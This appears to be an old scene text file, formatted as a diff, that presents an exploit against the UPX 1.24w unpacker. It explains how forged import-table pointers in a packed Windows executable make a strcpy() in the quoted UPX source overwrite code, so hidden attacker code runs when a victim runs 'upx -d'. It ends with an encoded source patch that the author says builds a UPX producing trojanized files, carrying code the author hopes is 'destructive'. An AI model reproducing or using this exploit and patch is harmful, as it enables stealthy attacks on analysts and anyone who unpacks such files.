@@ -1,0 +1,244 @@
+                                                            _   _:.
+                                                             :$$$$$
+         _   .     - +.                                     :l$³³$$
+   s¿¿,,_  +:@QSSS$$$$$                                      ``
+   $$$$$$$$bs¿.`"Ù?$$$l      [ upx1.24w -d exploit ]
+   'ÀÀ?$$³$$$$b¿_  .       [ dj ebeld0s ]
+            `"À$³$b.   .    [ root@localhost ]
+                  `À?b.  `.  
+                     `Ù.   +
+                      `$   _.
+                        `
+
+  Imagine some win32 pe executable. It can be worm or trojan, or whatever.When
+  you download  it from somewhere  and see that it is UPX'ed, you probably try 
+  'UPX -d'. If it works ok, file is unpacked, and you run IDA.
+
+  You  can even check UPX decryptor at entrypoint, and/or file format, and you
+  will see that both is okey, it is standard UPX'ed file.
+
+  In case of some normal application,you will see that unpacked file works the
+  same as packed one.
+
+  And whe you will look into unpacked file, you will NOT find inside of it any
+  part of the trojan code, which is currently working inside of your box.
+
+  How can it happen?
+
+  Well,  there  is  physical  and  virtual images of the executable. When file
+  is  compressed,  UPX  takes virtual image (i.e. object sections, aligned and
+  padded  with zeroes), appends part of the import table and "extra" data, and
+  then  all  this  stuff  is  compressed.  Then  UPX  merges new headers, that
+  compressed  data,  decompressor  code,  and  non-compressible  parts  of the
+  original file.
+
+  Just to note, original import table is splitted into two parts. 1st part,the
+  bigger one, is placed into compressed virtual image, just before extra data;
+  2nd  part (the  smaller  one) will  be located in the compressed file in the
+  plain form,and it will become the new import table. This is because win32 pe
+  loader system  works  differently with DLLs  loaded  statically (via  import
+  table) vs dinamically (via LoadLibrary); and as such, at least one  function
+  per DLL must  remain imported  via import table, to force  pe loader to load
+  DLLs in the same way as in the original file.
+
+  What  is  extra  data?  It  is  some data, used to support uncompression (-d
+  option), something like original PE header and some pointers.
+
+  Here is extra data format (taken from UPX sources):
+
+/*
+ extra info added to help uncompression:
+
+ <ih sizeof(pe_head)>
+ <pe_section_t objs*sizeof(pe_section_t)>
+ <start of compressed imports 4> - optional           \           (*)
+ <start of the names from uncompressed imports> - opt /           (**)
+ <start of compressed relocs 4> - optional   \
+ <relocation type indicator 1> - optional    /
+ <icondir_count 2> - optional
+ <offset of extra info 4>
+*/
+
+  So,  when  you  specify  -d  option,  'PackW32Pe::unpack()'  is  called,  it 
+  decompresses compressed virtual image, takes "extra" data, and uses pointers 
+  specified there to rebuild original structures: pe header, object table, and 
+  then import/export/fixup/resource tables.
+
+  To    rebuild    original    import    table,   'PackW32Pe::unpack()'  calls
+  'PackW32Pe::rebuildImports()', and it will use two pointers: (*) and (**).
+
+  These  pointers  says where exactly imported function/dll names are located:
+
+  (*) points to 1st (bigger, compressed) part of the import table,
+  (**) points to the 2nd (minimal, uncompressed) part.
+
+  To merge these two structures, the following code is executed:
+
+void PackW32Pe::rebuildImports(upx_byte *& extrainfo)
+{
+    if (ODADDR(PEDIR_IMPORT) == 0)
+        return;
+// !!! get (*) from "extra" data:
+    const upx_byte * const idata = obuf + get_le32(extrainfo);
+// !!! get (**) from "extra" data:
+    const unsigned inamespos = get_le32(extrainfo + 4);
+    extrainfo += 8;
+    unsigned sdllnames = 0;
+    const upx_byte *import = ibuf + IDADDR(PEDIR_IMPORT) - isection[2].vaddr;
+    const upx_byte *p = idata;
+    while (get_le32(p))
+    {
+        sdllnames += strlen(get_le32(p) + import) + 1;
+        for (p += 8; *p;)
+            if (*p == 1)
+                p += strlen(++p) + 1;
+            else if (*p == 0xff)
+                p += 3; // ordinal
+            else
+                p += 5;
+
+        p++;
+    }
+    sdllnames = ALIGN_UP(sdllnames,2);
+    upx_byte * const Obuf = obuf - rvamin;
+    import_desc * const im0 = (import_desc*) (Obuf + ODADDR(PEDIR_IMPORT));
+    import_desc *im = im0;
+    upx_byte *dllnames = Obuf + inamespos;
+    upx_byte *importednames = dllnames + sdllnames;
+    for (p = idata; get_le32(p); p++)
+    {
+        // restore the name of the dll
+        const unsigned iatoffs = get_le32(p + 4) + rvamin;
+        if (inamespos)
+        {
+            // now I rebuild the dll names
+            im->dllname = ptr_diff(dllnames,Obuf);
+// !!! strcpy() to be exploited:
+            strcpy(dllnames,get_le32(p) + import);
+            dllnames += strlen(dllnames) + 1;
+        }
+        else
+            strcpy(Obuf + im->dllname,get_le32(p) + import);
+        im->iat = iatoffs;
+        LE32 *newiat = (LE32 *) (Obuf + iatoffs);
+        // restore the imported names+ordinals
+        for (p += 8; *p; newiat++)
+            if (*p == 1)
+            {
+                unsigned len = strlen(++p) + 1;
+                if (inamespos)
+                {
+                    if (ptr_diff(importednames,oimpdlls) & 1)
+                        importednames--;
+                    memcpy(importednames + 2,p,len);
+                    //;;;printf(" %s",importednames+2);
+                    *newiat = ptr_diff(importednames,Obuf);
+                    importednames += 2 + len;
+                }
+                else
+                    strcpy(Obuf + *newiat + 2,p);
+                p += len;
+            }
+            else if (*p == 0xff)
+            {
+                *newiat = get_le16(p + 1) + 0x80000000;
+                //;;;printf(" %x",(unsigned)*newiat);
+                p += 3;
+            }
+            else
+            {
+                *newiat = get_le32(get_le32(p + 1) + import);
+                assert(*newiat & 0x80000000);
+                p += 5;
+            }
+        *newiat = 0;
+        im++;
+    }
+    //memset(idata,0,p - idata);
+}
+
+  So,  as  you  can  see,  if  we  insert  fake (*) and (**) pointers into the
+  compressed  file,  the  procedure  shown  above will deal with our fake data
+  structures. And later, strcpy() will be executed  with the pointers and data
+  we specify.
+
+  But its not the end of story, yet.
+
+  Using strcpy(), we insert our code right after that strcpy().
+
+  In the usual file,we can not write into .code section, since pages there are
+  read-only; but, in the UPX'ed files,these sections are read-write,since when
+  file is decompressed in memory, that memory area requires to be r/w.
+
+  And,which is more important, UPX.EXE we are trying to exploit, is compressed 
+  with itself, which makes it vulnerable.
+
+  When our  exploit   code  is executed,  it  calls the payload, then  repairs 
+  all   registers/variables,   and   jumps   back   to   the   prolog  of  the
+  'PackW32Pe::rebuildImports()', and then everything will continue to work the
+  same as if (*) and (**) pointers were unmodified, i.e. if our exploit works,
+  it works stealth.
+
+  But there are some negative aspects. Destination address for the strcpy() is
+  heap  based,  i.e.  we  should  know address of the heap block allocated  by
+  'PackW32Pe::unpack()' for  obuf[]  variable,  where   decompressed  file  is
+  formed at.
+
+  However,   win32   system and UPX.EXE uses the same addresses under the same
+  conditions,  and  the  only  thing you need to do is to find that heap block
+  address.
+
+  This address depends on: windows version (2K/XP works the same), UPX version
+  (it all were tested on upx1.24w) and file size.
+
+  In  case  of  incorrect  address  choosen, UPX  will  handle (in most cases)
+  exceptions in own code, and show something like 'internal error:   unhandled
+  exception!' and then 'this  file  has  possibly  been modified/hacked;  take 
+  care!', which is very similar to true.
+
+  The  following  add-on  is  a  patch for p_w32pe.cpp of the UPX 1.24w source
+  package,  and  it  will allow some of you to compile own upx.exe, which will
+  then   produce   trojanized   files:  such  files, packed with that modified
+  UPX,  will  work  the  same  as unpacked ones; packed files will not contain
+  exploit  code  in   the  plain form; unpacked files will not contain exploit
+  at  all;  only  when 'upx124w  -d'  will  be  executed  on such a file under
+  2k/xp  platform,  your  special (i hope, destructive) code will be stealthly
+  executed.
+
+p_w32pe.cpp.diff.gz
+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
+(!5O094H4```4
+`
